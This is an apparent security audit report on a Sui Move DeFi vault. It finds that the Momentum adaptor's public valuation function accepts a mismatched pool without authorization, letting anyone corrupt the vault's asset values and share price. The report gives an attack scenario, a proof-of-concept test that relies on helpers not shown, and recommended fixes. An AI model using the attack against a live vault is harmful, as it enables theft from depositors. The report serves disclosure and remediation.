# Audit Report

## Title
Unprotected Asset Type Mismatch in Momentum Position Valuation Enables USD Value Manipulation

## Summary
The `update_momentum_position_value()` function is publicly callable without authorization and lacks validation that the provided pool's token types match the position's actual tokens. This allows any attacker to manipulate the vault's USD value tracking by providing mismatched pools, directly corrupting share prices and enabling fund theft from vault participants.

## Finding Description

The vulnerability exists in the Momentum adaptor's position valuation flow. The `update_momentum_position_value` function is declared as `public fun`, making it callable by anyone without requiring `OperatorCap` authorization. [1](#0-0) 

The function accepts generic type parameters `CoinA, CoinB` and a `MomentumPool<CoinA, CoinB>` without validating that these match the position's actual token types. The `MomentumPosition` struct stores its actual token types in `type_x` and `type_y` fields. [2](#0-1) 

When calculating position value, the function uses the generic type parameters from the function signature to fetch oracle prices, not the position's stored types. [3](#0-2) 

The Momentum adaptor manually calculates token amounts without leveraging the pool to validate position ownership or type matching. [4](#0-3) 

In contrast, the Cetus adaptor delegates to the pool's `get_position_amounts(position_id)` function, which would validate that the position belongs to that specific pool. [5](#0-4) 

The `finish_update_asset_value` function that stores the calculated value only checks that the vault is enabled, with no operator authorization validation. [6](#0-5) 

**Attack Scenario:**
1. Vault contains a BTC-ETH Momentum position stored under key "mmt_v3::position::Position0"
2. Attacker calls `update_momentum_position_value<PrincipalCoin, USDC, SUI>(vault, config, clock, "mmt_v3::position::Position0", usdc_sui_pool)` via PTB
3. Function retrieves the BTC-ETH position but calculates amounts using USDC-SUI pool's `sqrt_price`
4. Oracle prices are fetched for USDC and SUI (not BTC and ETH)
5. Incorrect USD value is stored in `vault.assets_value["mmt_v3::position::Position0"]`
6. Total vault USD value and share ratio become corrupted

## Impact Explanation

This vulnerability enables direct economic damage through multiple attack vectors:

**Share Price Manipulation**: The vault's `get_total_usd_value` function sums all values from the `assets_value` table, and `get_share_ratio` divides this total by `total_shares`. [7](#0-6)  Corrupted asset values directly manipulate the share price used for all deposits and withdrawals.

**Fund Theft Mechanism**: An attacker can:
- Inflate position values before depositing to receive excess shares
- Deflate position values before withdrawing to extract more principal than entitled
- Repeat the attack to continuously drain value from other vault participants

**Loss Tolerance Bypass**: The manipulated valuations can bypass the `loss_tolerance` mechanism that protects against excessive losses per epoch, as the incorrect values make losses appear smaller or gains appear larger than reality.

**Broken Core Invariant**: The vault's fundamental guarantee of accurate USD value tracking is violated, undermining all financial operations including deposits, withdrawals, and operator performance tracking.

The severity is HIGH because it enables direct fund loss without requiring any privileged access, affecting all vault participants.

## Likelihood Explanation

The attack is highly feasible with minimal barriers:

**Reachable Entry Point**: The function is `public fun`, directly callable via Sui Programmable Transaction Blocks using `moveCall()`. No special capabilities or ownership required.

**Minimal Prerequisites**: Attacker only needs:
- Access to shared objects (Vault, OracleConfig, Clock) - all standard accessible
- A reference to any MomentumPool with different token types than the target position
- Knowledge of the target position's asset_type string (discoverable via on-chain events/queries)

**No Authorization**: Unlike vault operation functions that require `OperatorCap` and call `assert_operator_not_freezed()`, this function has zero access control checks beyond vault enabled status.

**Simple Execution**: Single PTB transaction executes the complete attack by providing the correct `asset_type` string but wrong `Pool<CoinA, CoinB>` generic types.

**Repeatable**: The attack can be executed continuously to maintain manipulated valuations or re-corrupt after legitimate updates.

The attack complexity is LOW with only gas cost barriers (negligible for the potential profit).

## Recommendation

Implement the following mitigations:

1. **Add Authorization**: Require `OperatorCap` and validate operator not frozen:
```move
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    // ... rest of parameters
) {
    vault::assert_operator_not_freezed(operation, cap);
    // ... rest of function
}
```

2. **Validate Pool ID**: Check that the position's `pool_id` matches the provided pool's ID. This requires either:
   - Adding a `pool_id()` getter to the MomentumPosition type
   - Storing and validating pool ID during position addition to vault

3. **Validate Token Types**: Either:
   - Add `type_x()` and `type_y()` getters to MomentumPosition and validate they match the generic parameters
   - Delegate to the pool for amount calculation (similar to Cetus pattern) to leverage pool's internal validation

4. **Consider Making Function Package-Only**: Change visibility to `public(package)` and expose only through authorized operator entry points.

## Proof of Concept

```move
#[test]
public fun test_momentum_type_mismatch_attack() {
    let mut scenario = test_scenario::begin(ATTACKER);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup: Vault with BTC-ETH Momentum position
    init_vault::init_vault(&mut scenario, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut scenario);
    
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let operation = scenario.take_shared<Operation>();
        let cap = scenario.take_from_sender<OperatorCap>();
        
        // Add BTC-ETH momentum position
        let btc_eth_position = create_momentum_position_btc_eth();
        operation::add_new_defi_asset(&operation, &cap, &mut vault, 0, btc_eth_position);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        scenario.return_to_sender(cap);
    };
    
    // Attack: Use USDC-SUI pool to value BTC-ETH position
    scenario.next_tx(ATTACKER);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let config = scenario.take_shared<OracleConfig>();
        let mut usdc_sui_pool = create_momentum_pool_usdc_sui();
        
        let asset_type = vault_utils::parse_key<MomentumPosition>(0);
        
        // Before: Get correct USD value
        let correct_value = vault.get_asset_value(asset_type);
        
        // Attack: Call with mismatched types
        momentum_adaptor::update_momentum_position_value<SUI_TEST_COIN, USDC, SUI>(
            &mut vault,
            &config,
            &clock,
            asset_type,
            &mut usdc_sui_pool
        );
        
        // After: USD value is now corrupted
        let corrupted_value = vault.get_asset_value(asset_type);
        
        // Assert value changed incorrectly (actual assertion depends on oracle prices)
        assert!(correct_value != corrupted_value, 0);
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        destroy_pool(usdc_sui_pool);
    };
    
    clock.destroy_for_testing();
    scenario.end();
}
```

**Notes:**
- The vulnerability allows any external caller to corrupt vault accounting by exploiting the lack of type validation between positions and pools
- All other adaptor update functions (Navi, Cetus, Suilend, Receipt) share the same public visibility without authorization, but Momentum is uniquely vulnerable due to manual calculation without pool validation
- The issue demonstrates a critical gap in the three-step operation pattern's value update phase, where external price updates lack the same authorization controls as vault operations

### Citations

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-32)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut MomentumPool<CoinA, CoinB>,
) {
    let position = vault.get_defi_asset<PrincipalCoinType, MomentumPosition>(asset_type);
    let usd_value = get_position_value(pool, position, config, clock);

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L34-67)
```text
public fun get_position_value<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
    config: &OracleConfig,
    clock: &Clock,
): u256 {
    let (amount_a, amount_b, sqrt_price) = get_position_token_amounts(pool, position);

    let type_name_a = into_string(get<CoinA>());
    let type_name_b = into_string(get<CoinB>());

    let decimals_a = config.coin_decimals(type_name_a);
    let decimals_b = config.coin_decimals(type_name_b);

    // Oracle price has 18 decimals
    let price_a = vault_oracle::get_asset_price(config, clock, type_name_a);
    let price_b = vault_oracle::get_asset_price(config, clock, type_name_b);
    let relative_price_from_oracle = price_a * DECIMAL / price_b;

    let pool_price = sqrt_price_x64_to_price(sqrt_price, decimals_a, decimals_b);
    let slippage = config.dex_slippage();
    assert!(
        (pool_price.diff(relative_price_from_oracle) * DECIMAL  / relative_price_from_oracle) < (DECIMAL  * slippage / SLIPPAGE_BASE),
        ERR_INVALID_POOL_PRICE,
    );

    let normalized_price_a = vault_oracle::get_normalized_asset_price(config, clock, type_name_a);
    let normalized_price_b = vault_oracle::get_normalized_asset_price(config, clock, type_name_b);

    let value_a = vault_utils::mul_with_oracle_price(amount_a as u256, normalized_price_a);
    let value_b = vault_utils::mul_with_oracle_price(amount_b as u256, normalized_price_b);

    value_a + value_b
}
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L69-91)
```text
public fun get_position_token_amounts<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
): (u64, u64, u128) {
    let sqrt_price = pool.sqrt_price();

    let lower_tick = position.tick_lower_index();
    let upper_tick = position.tick_upper_index();

    let lower_tick_sqrt_price = tick_math::get_sqrt_price_at_tick(lower_tick);
    let upper_tick_sqrt_price = tick_math::get_sqrt_price_at_tick(upper_tick);

    let liquidity = position.liquidity();

    let (amount_a, amount_b) = liquidity_math::get_amounts_for_liquidity(
        sqrt_price,
        lower_tick_sqrt_price,
        upper_tick_sqrt_price,
        liquidity,
        false,
    );
    (amount_a, amount_b, sqrt_price)
}
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/position.move (L10-24)
```text
    public struct Position has store, key {
        id: UID,
        pool_id: ID,
        fee_rate: u64,
        type_x: TypeName,
        type_y: TypeName,
        tick_lower_index: I32,
        tick_upper_index: I32,
        liquidity: u128,
        fee_growth_inside_x_last: u128,
        fee_growth_inside_y_last: u128,
        owed_coin_x: u64,
        owed_coin_y: u64,
        reward_infos: vector<PositionRewardInfo>,
    }
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L33-45)
```text
public fun calculate_cetus_position_value<CoinTypeA, CoinTypeB>(
    pool: &mut CetusPool<CoinTypeA, CoinTypeB>,
    position: &CetusPosition,
    config: &OracleConfig,
    clock: &Clock,
): u256 {
    let position_id = object::id(position);

    let (amount_a, amount_b) = pool.get_position_amounts(position_id);

    let type_name_a = into_string(get<CoinTypeA>());
    let type_name_b = into_string(get<CoinTypeB>());

```

**File:** volo-vault/sources/volo_vault.move (L1174-1203)
```text
public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
) {
    self.check_version();
    self.assert_enabled();

    let last_update_time = &mut self.assets_value_updated[asset_type];
    *last_update_time = now;

    let position_value = &mut self.assets_value[asset_type];
    *position_value = usd_value;

    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };

    emit(AssetValueUpdated {
        vault_id: self.vault_id(),
        asset_type: asset_type,
        usd_value: usd_value,
        timestamp: now,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1254-1318)
```text
public(package) fun get_total_usd_value<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    clock: &Clock,
): u256 {
    self.check_version();
    self.assert_enabled();

    let now = clock.timestamp_ms();
    let mut total_usd_value = 0;

    self.asset_types.do_ref!(|asset_type| {
        let last_update_time = *self.assets_value_updated.borrow(*asset_type);
        assert!(now - last_update_time <= MAX_UPDATE_INTERVAL, ERR_USD_VALUE_NOT_UPDATED);

        let usd_value = *self.assets_value.borrow(*asset_type);
        total_usd_value = total_usd_value + usd_value;
    });

    emit(TotalUSDValueUpdated {
        vault_id: self.vault_id(),
        total_usd_value: total_usd_value,
        timestamp: now,
    });

    total_usd_value
}

// * @dev Just get the total usd value without checking the update time (not correct & latest value)
public fun get_total_usd_value_without_update<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
): u256 {
    self.check_version();

    let mut total_usd_value = 0;

    self.asset_types.do_ref!(|asset_type| {
        let usd_value = *self.assets_value.borrow(*asset_type);
        total_usd_value = total_usd_value + usd_value;
    });

    total_usd_value
}

public(package) fun get_share_ratio<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    clock: &Clock,
): u256 {
    self.check_version();
    self.assert_enabled();

    if (self.total_shares == 0) {
        return vault_utils::to_decimals(1)
    };

    let total_usd_value = self.get_total_usd_value(clock);
    let share_ratio = vault_utils::div_d(total_usd_value, self.total_shares);

    emit(ShareRatioUpdated {
        vault_id: self.vault_id(),
        share_ratio: share_ratio,
        timestamp: clock.timestamp_ms(),
    });

    share_ratio
}
```
